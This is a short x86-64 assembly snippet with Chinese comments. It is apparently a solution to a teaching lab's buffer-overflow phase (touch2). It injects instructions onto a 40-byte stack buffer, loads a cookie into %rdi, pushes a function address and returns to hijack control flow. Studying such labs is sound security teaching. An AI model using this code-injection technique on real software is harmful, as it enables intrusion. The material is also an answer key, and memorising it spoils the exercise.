#将以下指令从rsp开始存放至getbuf的栈中
#getbuf 有40个字节的栈大小。需要填补后续的空白以至覆盖test的rbp为rsp，使得gebuf返回后能跳转至我们注入的指令
movq $0x59b997fa,%rdi   #将cookie中的值赋值至第一个参数
pushq $0x4017ec           #将touch2的开始地址压入栈中
retq                    #返回后touch2的地址出栈并跳转至touch2处